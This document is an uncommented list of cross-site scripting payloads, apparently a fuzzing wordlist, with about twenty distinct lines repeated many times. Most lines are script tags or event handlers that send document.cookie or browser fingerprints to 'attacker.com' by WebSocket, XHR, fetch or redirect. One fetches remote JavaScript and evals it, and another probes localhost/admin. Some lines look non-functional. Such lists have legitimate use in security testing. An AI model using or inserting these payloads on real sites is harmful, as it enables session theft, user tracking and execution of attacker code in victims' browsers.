<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
